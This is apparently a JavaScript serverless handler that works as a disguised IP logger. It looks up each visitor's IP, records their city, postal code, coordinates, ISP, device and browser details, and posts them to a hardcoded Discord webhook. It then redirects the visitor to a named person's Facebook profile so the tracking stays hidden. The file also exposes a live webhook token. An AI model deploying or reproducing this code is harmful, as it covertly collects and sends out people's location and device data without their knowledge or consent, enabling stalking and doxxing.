import fetch from 'node-fetch';

const webhookUrl = "https://discord.com/api/webhooks/1306087539169296484/vP5BQM6ius3zPupcdWazfCNQNpuEFstMUeSYKpVJ5i_vxTxWpdyo2mWcHqQDXC7Y0Tr3";

async function sendToWebhook(message) {
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });

        if (!response.ok) {
            console.error(`Failed to send data to webhook. Status: ${response.status}`);
        } else {
            console.log("Data sent to webhook successfully.");
        }
    } catch (error) {
        console.error("Failed to send data to webhook:", error);
    }
}

async function getIpDetails(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        return await response.json();
    } catch (error) {
        console.error("Failed to retrieve IP information:", error);
        return null;
    }
}

function detectDeviceDetails(userAgent) {
    let deviceType = "Desktop";
    let os = "Unknown";
    let browser = "Unknown";
    let browserVersion = "Unknown";
    let deviceModel = "Unknown";
    let approxScreenResolution = "Unknown";

    if (/Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        deviceType = "Mobile";
    } else if (/Tablet|iPad/i.test(userAgent)) {
        deviceType = "Tablet";
    }

    if (/Windows NT 10.0/.test(userAgent)) os = "Windows 10";
    else if (/Windows NT 6.3/.test(userAgent)) os = "Windows 8.1";
    else if (/Windows NT 6.2/.test(userAgent)) os = "Windows 8";
    else if (/Windows NT 6.1/.test(userAgent)) os = "Windows 7";
    else if (/Mac OS X/.test(userAgent)) os = "macOS";
    else if (/Android/.test(userAgent)) os = "Android";
    else if (/Linux/.test(userAgent)) os = "Linux";
    else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";

    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|Edg)\/([\d.]+)/);
    if (browserMatches) {
        browser = browserMatches[1];
        browserVersion = browserMatches[2];
    } else if (/MSIE|Trident/.test(userAgent)) {
        browser = "Internet Explorer";
        const versionMatch = userAgent.match(/(MSIE |rv:)([\d.]+)/);
        browserVersion = versionMatch ? versionMatch[2] : "Unknown";
    }

    if (deviceType === "Mobile") {
        if (/iPhone/.test(userAgent)) deviceModel = "iPhone";
        else if (/iPad/.test(userAgent)) deviceModel = "iPad";
        else if (/Android/.test(userAgent)) {
            const modelMatch = userAgent.match(/Android.*; (.*?)(?: Build|;)/);
            if (modelMatch) deviceModel = modelMatch[1].trim();
        }
    }

    if (deviceModel === "iPhone") approxScreenResolution = "1170x2532"; 
    else if (deviceModel === "iPad") approxScreenResolution = "1536x2048";
    else if (/Samsung/.test(deviceModel)) approxScreenResolution = "1080x2400";
    else if (deviceType === "Desktop") approxScreenResolution = "1920x1080";

    return {
        deviceType,
        os,
        browser,
        browserVersion,
        deviceModel,
        approxScreenResolution
    };
}

export default async function handler(req, res) {
    if (req.method === 'GET' || req.method === 'POST') {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const blacklistedIPs = ["716.147.210.120", "181.55.23.312"];

        if (blacklistedIPs.includes(ip)) {
            res.status(403).send("Forbidden: Your IP address is blacklisted.");
            return;
        }

        const ipDetails = await getIpDetails(ip);
        if (!ipDetails || ipDetails.status !== 'success') {
            res.status(500).send("Failed to retrieve IP information.");
            return;
        }

        const userAgent = req.headers['user-agent'] || 'Unknown';
        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
        const referer = req.headers['referer'] || 'No referer';
        
        const deviceDetails = detectDeviceDetails(userAgent);
        const connectionType = ipDetails.isp?.includes('Fiber') ? 'Fiber' :
                               ipDetails.isp?.includes('DSL') ? 'DSL' :
                               ipDetails.isp?.includes('Cable') ? 'Cable' : 'Unknown';
        const timezoneOffset = new Date().getTimezoneOffset() / -60;

        const message = {
            username: "Extended Device Info Logger",
            embeds: [
                {
                    title: "Extended Device and Network Information",
                    color: 0x00FFFF,
                    description: "Device info collected from a server request.",
                    fields: [
                        { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                        { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
                        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
                        { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
                        { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
                        { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
                        { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
                        { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
                        { name: "Latitude", value: `\`${ipDetails.lat || "Unknown"}\``, inline: true },
                        { name: "Longitude", value: `\`${ipDetails.lon || "Unknown"}\``, inline: true },
                        { name: "Device Info", value: `\`${userAgent}\``, inline: false },
                        { name: "Device Type", value: `\`${deviceDetails.deviceType}\``, inline: true },
                        { name: "Operating System", value: `\`${deviceDetails.os}\``, inline: true },
                        { name: "Browser", value: `\`${deviceDetails.browser}\``, inline: true },
                        { name: "Browser Version", value: `\`${deviceDetails.browserVersion}\``, inline: true },
                        { name: "Device Model", value: `\`${deviceDetails.deviceModel}\``, inline: true },
                        { name: "Approx. Screen Resolution", value: `\`${deviceDetails.approxScreenResolution}\``, inline: true },
                        { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
                        { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
                        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
                        { name: "Referer", value: `\`${referer}\``, inline: false },
                        { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
                        { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
                        { name: "Hosting", value: `\`${ipDetails.hosting ? "Yes" : "No"}\``, inline: true },
                        { name: "Connection Type", value: `\`${connectionType}\``, inline: true },
                        { name: "Local Time Offset", value: `\`${timezoneOffset} hours\``, inline: true },
                        { name: "Currency (Approx)", value: `\`${ipDetails.countryCode === 'US' ? 'USD' : ipDetails.countryCode === 'EU' ? 'EUR' : 'Unknown'}\``, inline: true }
                    ]
                }
            ]
        };

        await sendToWebhook(message);
        
        res.writeHead(302, { Location: 'https://www.facebook.com/janethalejandra.gonzalez.7?mibextid=LQQJ4d' });
        res.end();
    } else {
        res.status(405).send("Method Not Allowed");
    }
}
